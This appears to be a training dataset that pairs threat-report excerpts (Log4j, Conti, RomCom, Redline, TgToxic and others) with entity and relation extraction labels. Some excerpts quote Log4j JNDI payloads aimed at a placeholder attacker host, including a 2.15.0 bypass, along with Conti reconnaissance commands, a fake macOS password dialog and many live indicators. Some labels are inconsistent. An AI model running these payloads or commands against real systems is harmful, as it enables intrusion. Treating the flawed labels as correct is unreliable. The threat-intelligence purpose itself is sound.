{"instruction": "During our investigations, we were able to take over and sinkhole the techzenspace[.]com domain in the beginning of January 2022. This was done to try and prevent the backdoor from operating for the near future while attempting to identify additional infected organizations that are not Fortinet customers. Attribution We were able to attribute the iispool.aspx web shell to the Moses Staff group based on past research. Both the web shell path and its code are identical to the ones previously reported. Another recent publication referenced in the previous section reaffirms our attribution. All victims are Israeli organizations belonging to various industries. Although the attacks we identified did not reach a destructive stage, we can\u2019t rule out the possibility that the backdoor is used before that to exfiltrate data from target networks. Conclusion", "input": null, "output": "Named Entities: (techzenspace[.]com, Domain), (iispool.aspx, file), (Moses Staff group, attacker)\nRelationships: (iispool.aspx, attribute, Moses Staff group), (Moses Staff group, use, iispool.aspx)"}
{"instruction": "As shown in Figure 12, this sample is using IP address 198[.]27.77.242 for C2 (Command and Control). Examining that traffic in Wireshark shows STRRAT being exceptionally noisy. This is likely due to the C2 channel being offline at the time of the investigation. In its effort to obtain further instructions, the sample attempts to communicate over port 1780 and 1788 at one-second intervals, if not more in some instances. Figure 12 also shows a URL containing the domain \u201cjbfrost[.]live\u201d. This appears to be part of the C2 infrastructure for the malware but does not appear to be used (at least not at this time). The domain does not resolve currently. Conclusion", "input": null, "output": "Named Entities: (STRRAT, malware), (198[.]27.77.242, IP), (jbfrost[.]live, Domain)\nRelationships: (STRRAT, use, 198[.]27.77.242), (STRRAT, part of, jbfrost[.]live)"}
{"instruction": "How does the exploit work - CVE-2021-44228? Once a target has been selected, an attacker adds a JNDI query to a connection request to that target in a field that is likely to get logged via Log4j. For example: \u201c${jndi:ldap://malicious-server.host/aaa}\u201d A vulnerable version of Log4j then takes that request and attempts to contact \u201cmalicious-server.host\u201d with an LDAP query. Should the connection be successful, the \u201cmalicious-server.host\u201d under the attacker's control replies to the query by inserting a malicious Java class file location into the directory data. The Java implementation on the target then downloads the malicious Java class file and executes it. How does the remote code execution exploit work - CVE-2021-45046?", "input": null, "output": "Named Entities: (CVE-2021-44228, vulnerability), (Log4j, tool), (malicious-server.host, Domain), (CVE-2021-45046, vulnerability)\nRelationships: No related relations."}
{"instruction": "Once a target has been selected, an attacker adds a JNDI query to a connection request to that target in a field that is likely to get logged via Log4j. Due to the fix for CVE-2021-44228 in Log3j 2.15.0, remote JNDI queries are no longer permitted by default. Therefore, this can be worked around using the following as an example: \u201c${jndi:ldap://127.0.0.1#malicious-server.host/aaa}\u201d Version 2.15.0 of Log4j will view the request as valid due to localhost being present before the \u201c#\u201d; however, the framework will still resolve the entire string and attempt to contact \u201cmalicious-server.host\u201d with an LDAP query. Should the connection be successful, the \u201cmalicious-server.host\u201d under the attacker's control replies to the query by inserting a malicious Java class file location into the directory data. The Java implementation on the target will then download the malicious Java class file and execute it.", "input": null, "output": "Named Entities: (CVE-2021-44228, vulnerability), (malicious-server.host, Domain)\nRelationships: No related relations."}
{"instruction": "After getting the C2 server (life.zerobytes[.]cc) from its configuration, it starts sending heartbeat (\\x00\\x00) packets and then waits for the next control command from the C2 server. Once the victim system receives the command, it starts a DDoS attack to a specific IP address and port number. One example of the DDoS attack traffic is shown below: The DDoS attack command is 24 bytes and can be seen in the Data section in Figure 8. This detail is illustrated in the following figure, which includes the flood method and the target IP/Port. Except for SYN flood, the C2 server has other attacking commands, such as 0x06 for UDP flood, 0x04 for ACK flood, and 0x05 for ACK+PUSH flood. The complete attack scenario from trying to infect Hikvision product to deploying Moobot is shown in figure 10:", "input": null, "output": "Named Entities: (C&C server, tool), (life.zerobytes[.]cc, Domain), (DDoS attack, threat type)\nRelationships: (C&C server, domain, life.zerobytes[.]cc)"}
{"instruction": "The domain names have only been registered for a few days to a few months All sites are registered with the same registrar They use .TOP and .SHOP top-level domains (.com is also common) They use stolen imagery They contain numerous grammatical errors and inconsistencies in statements Social Media buttons do not resolve anywhere or go to accounts that either do not exist or have been deleted Their web hosting providers utilize content delivery networks (CDN) to remain anonymous (via an IP address that cannot be traced) Milwauketools.shop (Recently registered on 10/21/21) Milwaukee Tools is a well-known and globally established tool company based in the United States. Milwaukee Tools products are usually sold via authorized retailers online or in stores. We came across a recently registered online site, milwauketools[.]shop, that had the look and feel of a professional e-commerce retailer.", "input": null, "output": "Named Entities: (Milwauketools.shop, Domain)\nRelationships: No related relations."}
{"instruction": "Looking at the source code of the shopping cart, we see the string \u201c\u5237\u65b0\u6309\u94ae\u201c, which translates to a \u201crefresh button\u201d. Perhaps this is indicative of the origins of the group behind this site, or the shopping cart was repurposed from elsewhere. A visit to the actual company website (milwaukeetool.com) reveals that they do not sell direct, which is often the case for many major brands: A Bing.com shopping query highlighted that the lowest official price for this 2696-26 M18 LITHIUM-ION CORDLESS 6-TOOL COMBO KIT is $613.00 (USD).", "input": null, "output": "Named Entities: (milwaukeetool.com, Domain)\nRelationships: No related relations."}
{"instruction": "Further Scrutiny\nAs we dug deeper by using OSINT (Open Source Intelligence) searches on the major search engines, we found 19 more online retail sites using the same template and shopping carts as the Milwauketools.shop, suggesting that these are all part of a larger scam. This was further confirmed when we determined that they have all been registered with the same registrar. Included in our findings were websites selling Oculus (Facebook), Blink (Amazon), and many more.\u00a0\nThe Oculus Template:", "input": null, "output": "Named Entities: (Milwauketools.shop, Domain)\nRelationships: No related relations."}
{"instruction": "FortiEDR detected these DLLs because they loaded into memory space allocated for vbc.exe, the Visual Basic Compiler for .NET applications, and were loaded from the w3wp.exe process, which is used to run Microsoft Exchange's Outlook Web Application. This, along with FortiEDR's machine learning algorithm, determined that these files were likely malicious. The figure below shows w3wp.exe injecting a thread into the vbc.exe process and accessing services on the Exchange server. Next, the web shells were used to connect to numerous domain controllers within the environment, and we found the Thor.dll file in memory. This DLL is used to authenticate to the domain, modify security permissions, create domain accounts, and add accounts to Exchange roles. I analyze the Thor.dll in detail later.", "input": null, "output": "Named Entities: (FortiEDR, tool), (vbc.exe, file), (w3wp.exe, file), (Microsoft Exchange's Outlook Web Application, tool), (web shells, tool), (domain controllers, tool), (Thor.dll, file), (domain, tool), (security permissions, tool), (domain accounts, tool), (Exchange roles, tool)\nRelationships: (w3wp.exe, process, Microsoft Exchange's Outlook Web Application), (w3wp.exe, inject thread into, vbc.exe), (web shells, connect to, domain controllers), (web shells, use, Thor.dll), (Thor.dll, authenticate to, Domain), (Thor.dll, modify, security permissions), (Thor.dll, create, domain accounts), (Thor.dll, add accounts to, Exchange roles)"}
{"instruction": "The loader DLLs are also responsible for taking the output from the method calls and relaying it back to the web shell HTTP session that it was called from so the threat actor will get the output results from the DLL execution. This provides the threat actor with results from the HTTP session from which they interacted with the web shell. By using these method calls and linking them to the loaded DLLs, our team could recreate this activity using PowerShell. The results are shown below and are broken down by each DLL, along with a screenshot showing the output sent back through the web shell HTTP session. GetEcpWebConfigModule.dll This DLL gets the Exchange Control Panel (ECP) Web.config file from the Exchange server. This gives the threat actor access to some of the internal ECP configurations. More information about the web.config file can be found here. DomainGroups.dll", "input": null, "output": "Named Entities: (loader DLLs, tool), (web shell HTTP session, tool), (GetEcpWebConfigModule.dll, file), (Exchange server, tool), (DomainGroups.dll, file)\nRelationships: (loader DLLs, responsible for, web shell HTTP session), (web shell HTTP session, interacted with, GetEcpWebConfigModule.dll), (GetEcpWebConfigModule.dll, gets, Exchange server)"}
{"instruction": "Another compounding factor is the new RaaS model. This maturing strategy allows vetted \u201caffiliates\u201d to conduct attacks, rather than the organization that developed the malware. Using a sort of franchise model, affiliates earn a hefty sum of the ransom while paying the ransomware authors a percentage of their gains. For the developers, the money comes through scalability, giving them time to refine their service rather than hunting for victims. This also means that the rate and volume of attacks necessarily increases as the number of affiliates grows. Reports by researchers estimate that ransomware attacks alone in 2020 grew over 150 percent and have netted attackers over 350 million dollars.1,2 [1] Group-IB: ransomware empire prospers in pandemic-hit world. Attacks grow by 150% https://www.group-ib.com/media/ransomware-empire-2021/ [2] Ransomware Skyrocketed in 2020, But There May Be Fewer Culprits Than You Think https://blog.chainalysis.com/reports/ransomware-ecosystem-crypto-crime-2021", "input": null, "output": "Named Entities: (affiliates, attacker), (organization, attacker), (malware, tool), (ransomware authors, attacker), (developers, attacker), (Group-IB, tool), (https://www.group-ib.com/media/ransomware-empire-2021/, URL), (blog.chainalysis.com, Domain)\nRelationships: (affiliates, conduct, attacks), (organization, developed, malware), (affiliates, pay, ransomware authors), (Group-IB, estimate, ransomware attacks), (Group-IB, estimate, netted attackers), (Group-IB, source, https://www.group-ib.com/media/ransomware-empire-2021/)"}
{"instruction": "A cursory analysis of the manual, shown above, highlights the well documented operational procedures of the Conti ransomware group. Titled CobaltStrike Manuals_V2 Active Directory, the document provides insight into the usage (misuse) of Cobalt Strike, a legitimate post exploitation tool used by red teams, along with other how-to guidance and advice from the gang. In figure 1, we see (highlighted in green) a suggestion to affiliates to seek out targets and companies with verifiable income by using publicly available data, such as Owler, Manta, Zoominfo, DNB, RocketReach, etc. It also provides working search engine queries to determine company revenue, e.g., \"site:XYZ.com revenue\" for further specifics. This information is commonly used to gauge the financial resources of lesser well-known entities, as well as to determine how much an organization is willing to pay.", "input": null, "output": "Named Entities: (Conti ransomware group, attacker), (CobaltStrike, tool), (XYZ.com, Domain)\nRelationships: (Conti ransomware group, use, CobaltStrike)"}
{"instruction": "The example above highlights the gang\u2019s efforts to provide useful insight to their affiliates based on what we assume is from their own experiences as they appear to have pentesters on their staff or, at least, individuals knowledgeable of pentesting techniques. The example below highlights the domain controller information for a successful construction company who may have likely already been a victim of the gang. The document further explains to the reader to look for the parameter of: Lockout threshold: Never Setting the lockout threshold to \u201cNever\u201d means that the account will not be locked after a set number of failed attempts occurs: Scenario with domain administrators We collect the list of domain administrators with the command shell net group \"domain admins\" / dom We write the received data to the admins.txt file 2 . Fill the file on the host in the folder C: \\ ProgramData", "input": null, "output": "Named Entities: (gang, attacker), (domain controller, tool), (admins.txt, file)\nRelationships: No related relations."}
{"instruction": "3 . Requesting information on the domain account blocking policy (protection against brute force) beacon> shell net accounts / dom Tasked beacon to run: net accounts / dom host called home, sent: 48 bytes received output: The request will be processed at a domain controller for domain [redacted]construction.com. Force user logoff how long after time expires ?: Never Minimum password age (days): 1 Maximum password age (days): 42 Minimum password length: 6 Length of password history maintained: 24 Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: BACKUP Figure 5. More Context into the Forced User Logoff Module", "input": null, "output": "Named Entities: (protection against brute force, threat type), (beacon, tool), (redacted]construction.com, Domain)\nRelationships: No related relations."}
{"instruction": "The infection starts once the user searches for \u201cWinSCP Download\u201d on the Bing search engine. A malicious ad for the WinSCP application is displayed above the organic search results. The ad leads to a suspicious website containing a tutorial on how to use WinSCP for automating file transfer. From this first page, the user is then redirected to a cloned download webpage of WinSCP (winsccp[.]com). Once the user selects the \u201cDownload\u201d button, an ISO file is downloaded from an infected WordPress webpage (hxxps://events.drdivyaclinic[.]com). Recently, the malicious actor changed their final stage payload URL to the file-sharing service 4shared. The overall infection flow involves delivering the initial loader, fetching the bot core, and ultimately, dropping the payload, typically a backdoor. In summary, the malicious actor uses the following malvertising infection chain:", "input": null, "output": "Named Entities: (Bing search engine, tool), (WinSCP application, tool), (winsccp[.]com, Domain), (hxxps://events.drdivyaclinic[.]com, URL), (4shared, tool), (infected WordPress webpage, tool), (bot core, malware), (payload, malware), (backdoor, malware)\nRelationships: (Bing search engine, leads to, WinSCP application), (WinSCP application, leads to, winsccp[.]com), (winsccp[.]com, redirects to, infected WordPress webpage), (malicious actor, changed URL to, 4shared), (malicious actor, uses, infected WordPress webpage), (malicious actor, uses, bot core), (malicious actor, drops, payload)"}
{"instruction": "During our investigation, we found another IP address on June 3 that was still active at the time of writing. This IP address, which uses port 3000 and the title Blog, is within the IP range of the previous addresses. We surmise that the threat actor relocates some of its infrastructure when their IP address is exposed. Using this third leak site, we were able to find their file storage site (aeey7hxzgl6zowiwhteo5xjbf6sb36tkbn5hptykgmbsjrbiygv4c4id[.]onion). This site hosts critical data stolen from victims such as documents, contracts, and other large amounts of data. The Trigona ransomware group has poor operational security when it comes to the implementation of Tor sites \u2014 although their aim of targeting poorly-managed SQL servers is not something we usually see with less technically-proficient threat actors. Our ransomware spotlight on TargetCompany shows another group using a similar technique of targeting SQL servers.", "input": null, "output": "Named Entities: (aeey7hxzgl6zowiwhteo5xjbf6sb36tkbn5hptykgmbsjrbiygv4c4id[.]onion, Domain)\nRelationships: No related relations."}
{"instruction": "We classified the top 10 alive times into three clusters: 473 seconds, 200 seconds, and 170 seconds. Since many analysis systems are involved, we think that these times are some of the more common timeout settings for different sandboxes. For example, the default timeout setting in the CAPEv2 sandbox is exactly 200 seconds. Unfortunately, we could not confirm what the other alive times are for. Bad operational security During our investigation, we collected several download links for malicious archive files. We noticed that the threat actors distributed not only Google Drive links but also other IP addresses hosted by different cloud providers. Here are some download links that we recently observed: IP/Domain Path http://80[.]85[.]156[.]232 /fav/tw1 http://80[.]85[.]156[.]240 /fav/sWjp /fav/hKjp /fav/sNjp /fav/gTjp /fav/aMjp /fav/128tr /fav/128tw /fav/yMjp http://80[.]85[.]156[.]151 /fav/eeAll http://103[.]159[.]132[.]91 /fav/trteamC /fav/trA /fav/trHatip /file/tr /file/lv https://sa2il[.]johnsimde[.]xyz /f/LV https://iot[.]johnsimde[.]xyz /f/TR https://em2in[.]johnsimde[.]xyz /f/LV https://rewards[.]roshan[.]af /aspnet_client/gdrive.htm /aspnet_client/View.htm /aspnet_client/acv.htm Table 8. Download sites", "input": null, "output": "Named Entities: (Google Drive, tool), (80[.]85[.]156[.]232, IP), (80[.]85[.]156[.]240, IP), (80[.]85[.]156[.]151, IP), (103[.]159[.]132[.]91, IP), (sa2il[.]johnsimde[.]xyz, Domain), (iot[.]johnsimde[.]xyz, Domain), (em2in[.]johnsimde[.]xyz, Domain), (rewards[.]roshan[.]af, Domain)\nRelationships: No related relations."}
{"instruction": "In addition to these technical evasion techniques, RomCom is being distributed using lure sites that often appear legitimate and are being utilized in narrow targeting. This makes automated blocking of these lure websites through web reputation systems harder. Void Rabisu has been using Google Ads to entice their targets to visit the lure sites, similar to a campaign that distributed IcedID botnet in December 2022. A key difference is that while IcedID\u2019s targeting was wider, Void Rabisu probably opted for narrower targeting that Google Ads offers to its advertisers. RomCom campaigns also make use of highly targeted spear phishing emails. On the RomCom lure sites, targets are offered trojanized versions of legitimate applications, like chat apps such as AstraChat and Signal, PDF readers, remote desktop apps, password managers, and other tools, that are typically used by system administrators. dirwinstat.com (as of April 4, 2023) devolrdm.com (as of March 23, 2023)", "input": null, "output": "Named Entities: (RomCom, malware), (Void Rabisu, attacker), (Google Ads, tool), (IcedID botnet, malware), (dirwinstat.com, Domain), (devolrdm.com, Domain)\nRelationships: (Void Rabisu, use, Google Ads), (dirwinstat.com, seen in, RomCom), (devolrdm.com, seen in, RomCom)"}
{"instruction": "vectordmanagesoft.com (as of March 22, 2023) cozy-sofware.com (as of March 13, 2023) devolutionrdp.com (as of March 6, 2023) astrachats.com (as of February 27, 2023) chatgpt4beta.com (as of February 23, 2023) singularlabs.org (as of January 30, 2023) gotomeet.us (as of December 14, 2022) gllmp.com (as of December 8, 2022) lnfo-messengers.com (as of November 3, 2022) pass-shield.com (as of October 15, 2022) pdffreader.com (as of October 12, 2022) veeame.com (as of September, 9 2022) npm-solar.com (as of July 31, 2022) advanced-ip-scanners.com (as of July 20, 2022) Table 1. RomCom lure sites Image credit: DomainTools", "input": null, "output": "Named Entities: (vectordmanagesoft.com, Domain), (cozy-sofware.com, Domain), (devolutionrdp.com, Domain), (astrachats.com, Domain), (chatgpt4beta.com, Domain), (singularlabs.org, Domain), (gotomeet.us, Domain), (gllmp.com, Domain), (lnfo-messengers.com, Domain), (pass-shield.com, Domain), (pdffreader.com, Domain), (veeame.com, Domain), (npm-solar.com, Domain), (advanced-ip-scanners.com, Domain)\nRelationships: No related relations."}
{"instruction": "We count a few dozen lure websites that have been set up since July 2022. RomCom shows a mix in their targeting methodologies, mixing typical cybercriminal TTPs with TTPs that are more common for APT actors. For example, RomCom used spear phishing against a member of a European parliament in March 2022, but targeted a European defense company in October 2022 with a Google Ads advertisement that led to an intermediary landing site that would redirect to a RomCom lure site. That intermediary landing site used the domain name \u201ckagomadb[.]com,\u201d which was later used for Qakbot and Gozi payloads in December 2022.", "input": null, "output": "Named Entities: (RomCom, attacker), (kagomadb[.]com, Domain), (Qakbot, malware), (Gozi, malware)\nRelationships: (kagomadb[.]com, used for, Qakbot), (kagomadb[.]com, used for, Gozi)"}
{"instruction": "The RomCom 3.0 sample that was used in the AstraChat campaign was signed by a Canadian company called Noray Consulting Ltd., which has a LinkedIn page (Figure 8), a website, and even a listing in a business registry in Canada (Figure 9). Figure 8. Screenshot of Noray Consulting's LinkedIn page Figure 9. Ontario business registry search results for Noray Consulting The company\u2019s LinkedIn page goes on to mention that Noray Consulting works on SOX compliance, an annual audit mandated by the Sarbanes-Oxley Act (SOX), as well as other areas of risk control. However, the LinkedIn page also points to a website, noray[.]ca, that does not exist.", "input": null, "output": "Named Entities: (RomCom 3.0, malware), (Noray Consulting Ltd., attacker), (noray[.]ca, Domain)\nRelationships: (RomCom 3.0, used in, AstraChat campaign), (RomCom 3.0, signed by, Noray Consulting Ltd.), (Noray Consulting Ltd., website, noray[.]ca)"}
{"instruction": "Internet searches for Noray Consulting show that its main website has a non-matching domain name, firstbyteconsulting[.]com. The website used to be for a company that specialized in project management. This domain appears to have expired in 2020, but was bought and repurposed to resemble the website from before 2020. What ties this domain to Noray Consulting now is that the address details on the website match that which is found on Noray Consulting\u2019s LinkedIn page: a Canadian company in Milton, Ontario. The contact page has a map that shows the company\u2019s location, but the map is in Russian (Figure 10). This could mean that the person who made this Google map had their primary language set to Russian, which would be unusual for a seemingly Canadian-based company. Figure 10. Screenshot of the website\u2019s contact page map", "input": null, "output": "Named Entities: (firstbyteconsulting[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "The previously collected files are compressed into a file named diagnostics.zip and stored in the path <%localappdata%\\Microsoft\\diagnostics.zip>. The stealer uses gofile.io, a file-sharing platform that allows users to upload and share files anonymously. Initially, the stealer fetches the best available gofile.io server by querying api.gofile.io. Depending on the response, the best server to send files to or receive files from is used in the subsequent request in the format storeX.gofile.io, where \u201cX\u201d is a number (such as \u201cstore2\u201d in Figure 6). The stealer then uploads the compressed file via a POST request to the endpoint /uploadFile. The body of the POST request contains the collected credentials from the victim.", "input": null, "output": "Named Entities: (diagnostics.zip, file), (gofile.io, file), (api.gofile.io, Domain), (storeX.gofile.io, Domain)\nRelationships: (diagnostics.zip, compressed into, file)"}
{"instruction": "The newly created .dll file is an encrypted resource file that is injected into the MS Build process. The file is meticulously obfuscated, adding an extra layer of complexity for analysts. After inspecting the process\u2019 memory, we found that the configuration information of the injected payload is Base64-encoded and the new process communicates with one of the three C&Cs using TCP ports 9090, 9091, or 9092 to download a cryptocurrency miner: 179[.]43[.]155[.]202 work[.]letmaker[.]top su-94[.]letmaker[.]top Conclusion", "input": null, "output": "Named Entities: (C&C server, tool), (179[.]43[.]155[.]202, IP), (work[.]letmaker[.]top, Domain), (su-94[.]letmaker[.]top, Domain)\nRelationships: (C&C server, IP, 179[.]43[.]155[.]202), (C&C server, domain, work[.]letmaker[.]top), (C&C server, domain, su-94[.]letmaker[.]top)"}
{"instruction": "When a victim executes the downloaded installer (Midjourney-x64.msix), it will display a fake installation window while the malicious PowerShell download process continues to run in the background. Note that there is no desktop version of Midjourney, so this in itself should already be a red flag for users. Figure 6 shows the campaign\u2019s infection chain leading to the PowerShell execution of the script as seen from the Trend Vision One\u2122 console. Trend Micro can proactively block this malicious process from executing via its Behavior Monitoring Solution. In this particular campaign, victims are eventually led to a Redline stealer once they have downloaded and executed the fake Midjourney installer. The MSIX file (Midjourney-x64.msix) will attempt to execute an obfuscated PowerShell script named frank_obfus.ps1. The decoded version of this script will download and execute the Redline payload from the server openaijobs[.]ru.", "input": null, "output": "Named Entities: (Midjourney-x64.msix, file), (malicious PowerShell, tool), (Trend Vision One\u2122, tool), (Trend Micro, tool), (Redline stealer, malware), (frank_obfus.ps1, file), (openaijobs[.]ru, Domain)\nRelationships: (Midjourney-x64.msix, execute, malicious PowerShell), (Midjourney-x64.msix, execute, frank_obfus.ps1)"}
{"instruction": "While the malicious actors abuse neither definitive software nor target any definitive applications, they commonly use multimedia editors or video format converters, cryptocurrency coinminer apps, phone-related desktop apps, and system cleaner apps. Through all the samples we analyzed, we consistently observed the following binary carriers: gup.exe from Notepad++ firefox.exe from Tor ErrorReportClient.exe from Magix, a type of multimedia-editing software The malware arrives as a package of the carrier executable and the decryptor/loader DLL, typically downloaded from the websites or torrents of (illegal) software solutions. For the most part, the malware is posed as a software activator, patcher, or keygen, among other similar software executables. The malicious routine starts after the software executables have been included and run in the system. We also noticed that ViperSoftX\u2019s primary C&C servers for the second stage download would change on a monthly basis: February: chatgigi2[.]com March: arrowlchat[.]com April: static-cdn-349[.]net Infection routine", "input": null, "output": "Named Entities: (multimedia editors, tool), (video format converters, tool), (cryptocurrency coinminer apps, tool), (phone-related desktop apps, tool), (system cleaner apps, tool), (gup.exe, file), (Notepad++, tool), (firefox.exe, file), (Tor, tool), (ErrorReportClient.exe, file), (Magix, tool), (ViperSoftX, attacker), (chatgigi2[.]com, Domain), (arrowlchat[.]com, Domain), (static-cdn-349[.]net, Domain)\nRelationships: (multimedia editors, used by, malicious actors), (video format converters, used by, malicious actors), (cryptocurrency coinminer apps, used by, malicious actors), (phone-related desktop apps, used by, malicious actors), (system cleaner apps, used by, malicious actors), (gup.exe, carrier of, malware), (Notepad++, used by, gup.exe), (firefox.exe, carrier of, malware), (Tor, used by, firefox.exe), (ErrorReportClient.exe, carrier of, malware), (Magix, used by, ErrorReportClient.exe)"}
{"instruction": "3. It uses chainbreaker to dump the keychain. 4. It pops a dialog box to defraud the user's password using osascript with the command: osascript -e display dialog 'MacOS wants to access the System Preferences' The dialog box is titled \u201cSystem Preferences\u201d, with icon caution default answer \u201cwith hidden answer.\u201d 5. It tries to send the information collected to the command and control (C&C) server mac[.]cracked23[.]site in a Zip file. Once downloaded and running in the victim\u2019s system, MacStealer steals the victim\u2019s wallet data and proceeds to empty the cryptocurrency wallets. If the victim does not have a cryptocurrency wallet, the malware steals user information and the keychain. We were able to find tweets from the victims warning others of this campaign. Spread via social media, other platforms", "input": null, "output": "Named Entities: (chainbreaker, tool), (osascript, tool), (mac[.]cracked23[.]site, Domain), (MacStealer, malware), (cryptocurrency wallets, threat type)\nRelationships: (MacStealer, steal, cryptocurrency wallets)"}
{"instruction": "https[://]twitter.com/naerycrypto/status/1637226997817692161 https[://]twitter.com/CiervoKing/status/1637220583736762370 c) They post fake job vacancies and entice job hunters to download their malware binary: https[://]twitter.com/witty_taeil/status/1631654308218298368 Table 1. List of websites and social media accounts with fake advertisements and equivalent real games cybercriminals plagiarized from Website Twitter account App name Confirmed downloaded file (SHA256) Original game website ryzex[.]io/ https[://]twitter.com/RyzeX_web3 RYZEX https[://]drunk-robots.com/ pearlmetaverse[.]io/ https[://]twitter.com/MetaversePearl Pearl Land mysteriangame[.]com https[://]twitter.com/MysterianGame Mysterian worldofcreatures[.]io https[://]twitter.com/WOC_io/ World of Creatures 8ea33c34647578b79dd8bb7dcf01a8ad1c79e7ada3fd61aca397ed0a2ac57276 https[://]cryptureworld.com/ toncap[.]io https[://]twitter.com/neuromaster9/status/1614074785289437184?s=61 https[://]twitter.com/yoshisakatahi/status/1615686095307522049?s=61 Compared to other fake apps, this is publicized using a personal account (instead of an \u201cofficial\u201d business account). Ton Caps 7bb7b51494c60401c8535baaa30cddb1c41c436e778092f30db5260c42cc70f6 play-impulseflow[.]com https[://]twitter.com/lmpulse_Flow Impulse Flow 02e1d9ea3a0c16106d173b0e6349a18a9aeafacc38650e359cfe1ee2298aaa45 https[://]embersword.com https[://]twitter.com/PureMetaverse https[://]twitter.com/MetaPureLand Pureland Some people have posted on Twitter accounts warning about the malicious activities associated with the fake game apps and websites. Conclusion", "input": null, "output": "Named Entities: (https[://]twitter.com/naerycrypto/status/1637226997817692161, URL), (https[://]twitter.com/CiervoKing/status/1637220583736762370, URL), (https[://]twitter.com/witty_taeil/status/1631654308218298368, URL), (ryzex[.]io/, Domain), (https[://]twitter.com/RyzeX_web3, URL), (pearlmetaverse[.]io/, Domain), (https[://]twitter.com/MetaversePearl, URL), (mysteriangame[.]com, Domain), (https[://]twitter.com/MysterianGame, URL), (worldofcreatures[.]io, Domain), (https[://]twitter.com/WOC_io/, URL), (8ea33c34647578b79dd8bb7dcf01a8ad1c79e7ada3fd61aca397ed0a2ac57276, SHA256), (https[://]cryptureworld.com/, URL), (toncap[.]io, Domain), (https[://]twitter.com/neuromaster9/status/1614074785289437184?s=61, URL), (https[://]twitter.com/yoshisakatahi/status/1615686095307522049?s=61, URL), (7bb7b51494c60401c8535baaa30cddb1c41c436e778092f30db5260c42cc70f6, SHA256), (play-impulseflow[.]com, Domain), (https[://]twitter.com/lmpulse_Flow, URL), (02e1d9ea3a0c16106d173b0e6349a18a9aeafacc38650e359cfe1ee2298aaa45, SHA256),  (https[://]embersword.com, URL), (https[://]twitter.com/PureMetaverse, URL), (https[://]twitter.com/MetaPureLand, URL)\nRelationships: No related relationships."}
{"instruction": "USB Driver.exe then starts checking whether it is properly installed. If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf. If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence. Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded. It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.", "input": null, "output": "Named Entities: (USB Driver.exe, file), (autorun.inf, file), (ACNSHELL malware, malware), (rzlog4cpp.dll, file), (ncat.exe, file), (closed[.]theworkpc[.]com, Domain)\nRelationships: (USB Driver.exe, copy, autorun.inf), (USB Driver.exe, sideload, ACNSHELL malware), (ACNSHELL malware, create, reverse shell), (reverse shell, connect to, closed[.]theworkpc[.]com)"}
{"instruction": "Attribution\nOur findings allow us to attribute this attack to the Earth Kitsune threat actor with medium confidence. Injecting malicious scripts into North Korean-related websites shows a similar modus operandi and victimology to the previous activities of the group. Furthermore, the delivery server and the C&C server of WhiskerSpy used in this attack have two infrastructure overlaps with our previous research on Operation Earth Kitsune.\nThe first overlap we noticed is that both WhiskerSpy's C&C domain londoncity[.]hopto[.]org and Earth Kitsune\u2019s domain rs[.]myftp[.]biz were resolved to the same IP address 45[.]76[.]62[.]198.\nThe second overlap is that WhiskerSpy\u2019s C&C domains londoncity[.]hopto[.]org and updategoogle[.]servehttp[.]com, plus the domain of the delivery server microsoftwindow[.]sytes[.]net were all resolved to 172[.]93[.]201[.]172. This IP address was also mapped from the domain selectorioi[.]ddns[.]net which was used by Earth Kitsune\u2019s agfSpy backdoor.", "input": null, "output": "Named Entities: (Earth Kitsune, attacker), (WhiskerSpy, malware), (Londoncity[.]hopto[.]org, Domain), (rs[.]myftp[.]biz, Domain), (45[.]76[.]62[.]198, IP), (updategoogle[.]servehttp[.]com, Domain), (microsoftwindow[.]sytes[.]net, Domain), (172[.]93[.]201[.]172, IP), (selectorioi[.]ddns[.]net, Domain), (agfSpy, malware)\nRelationships: (Earth Kitsune, attribution, WhiskerSpy), (WhiskerSpy, C&C domain, updategoogle[.]servehttp[.]com), (WhiskerSpy, delivery server domain, microsoftwindow[.]sytes[.]net)"}
{"instruction": "In July 2022, we found two potentially hacked Facebook accounts advertising scam messages on some Taiwanese community groups claiming users could get an allowance for hurricane, flood, and COVID victims\u2019 assistance. The posts cited that users could register in download.tw1988[.]link to apply, which is in fact a phishing site. Unwitting users could have been victimized as the link masqueraded as the official government website https://1988.taiwan.gov.tw/ used to provide allowances for people in difficult situations. Supplementary Scams: Sextortion and Cryptocurrency Tracking the network infrastructure used by TgToxic, we subsequently found the threat actors also behind sextortion and cryptocurrency scams in Taiwan and Indonesia. The malicious apps could also be downloaded from the same website down[.]tw1988[.]link and masqueraded as dating, messaging, lifestyle, or cryptocurrency-related apps to trick users into installing and enabling the permissions for it. Recent Activities: Phishing in Thailand", "input": null, "output": "Named Entities: (Facebook accounts, attacker), (download.tw1988[.]link, Domain), (TgToxic, attacker)\nRelationships: (Facebook accounts, advertise, scam messages), (scam messages, cite, download.tw1988[.]link), (TgToxic, behind, sextortion and cryptocurrency scams)"}
{"instruction": "As we continued monitoring TgToxic malware and its network infrastructure, we found that in some weeks toward the end of 2022 to early January 2023, the cybercriminals behind the campaign began targeting Thai users with similar sextortion and phishing lures observed targeting Taiwanese users, and the group started to add malicious code to steal credentials from bank applications. We also found both schemes already raising attention in the local media and were reported on Facebook among popular communities. The phishing, sextortion, and cryptocurrency scams connect to the latest deployment samples of TgToxic malware as they all download from the same website, down[.]tw1988[.]link. Observing the communications to and from the command and control (C&C) servers, the C&C for these apps and malware changed from api[.]tw1988[.]link to test[.]ja7[.]site, and later to us[.]ja7[.]site corresponding the change of targeting from Taiwan to Thailand. Technical Analysis of TgToxic", "input": null, "output": "Named Entities: (TgToxic, malware), (down[.]tw1988[.]link, Domain), (api[.]tw1988[.]link, Domain), (test[.]ja7[.]site, Domain), (us[.]ja7[.]site, Domain)\nRelationships: (TgToxic, download from, down[.]tw1988[.]link), (down[.]tw1988[.]link, C&C, api[.]tw1988[.]link), (api[.]tw1988[.]link, C&C, test[.]ja7[.]site), (test[.]ja7[.]site, C&C, us[.]ja7[.]site)"}
